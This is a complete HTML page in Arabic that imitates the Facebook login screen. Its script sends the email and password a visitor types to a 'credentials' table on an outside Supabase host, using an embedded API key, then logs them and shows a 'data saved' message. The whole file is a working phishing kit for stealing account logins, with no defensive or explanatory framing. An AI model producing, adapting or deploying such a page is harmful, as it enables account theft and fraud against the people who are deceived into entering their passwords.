<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>فيسبوك</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Tahoma,Arial,sans-serif}
body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px;width:396px;text-align:center}
h1{color:#1877f2;font-size:40px;margin-bottom:20px}
input{width:100%;padding:14px;margin-bottom:12px;border:1px solid #dddfe2;border-radius:6px;font-size:17px;direction:ltr;text-align:left}
button{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:bold;cursor:pointer}
button:hover{background:#166fe5}
#msg{margin-top:10px;font-size:14px;color:green;display:none}
#err{margin-top:10px;font-size:14px;color:red;display:none}
</style>
</head>
<body>

<div class="card">
  <h1>facebook</h1>
  <input id="email" type="email" placeholder="البريد الإلكتروني">
  <input id="password" type="password" placeholder="كلمة السر">
  <button onclick="saveAndLogin()">تسجيل الدخول</button>
  <div id="msg">✅ تم حفظ البيانات!</div>
  <div id="err"></div>
</div>

<script>
const SUPABASE_URL = 'https://jiunnlqezndakjcvnlpy.supabase.co';
// ⚠️ ضع المفتاح الصحيح من Settings → API في Supabase
const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImppdW5ubHFlem5kYWtqY3ZubHB5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzczODA0NjUsImV4cCI6MjA5Mjk1NjQ2NX0.fi7Qfp9GR6-JSNRbOmdKztu_jSOgLtECE01I28zxk1c';

async function saveAndLogin() {
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;
  const msg = document.getElementById('msg');
  const err = document.getElementById('err');
  
  msg.style.display = 'none';
  err.style.display = 'none';
  
  if (!email || !password) {
    err.textContent = 'يرجى ملء جميع الحقول';
    err.style.display = 'block';
    return;
  }

  try {
    const res = await fetch(`${SUPABASE_URL}/rest/v1/credentials`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'apikey': SUPABASE_KEY,
        'Authorization': `Bearer ${SUPABASE_KEY}`
      },
      body: JSON.stringify({ email: email, password: password })
    });

    if (res.ok) {
      msg.style.display = 'block';
      console.log('✅ تم حفظ:', email, password);
    } else {
      const text = await res.text();
      err.textContent = 'خطأ: ' + text;
      err.style.display = 'block';
      console.error('❌ فشل:', text);
    }
  } catch(e) {
    err.textContent = 'خطأ: ' + e.message;
    err.style.display = 'block';
  }
}
</script>
</body>
</html>
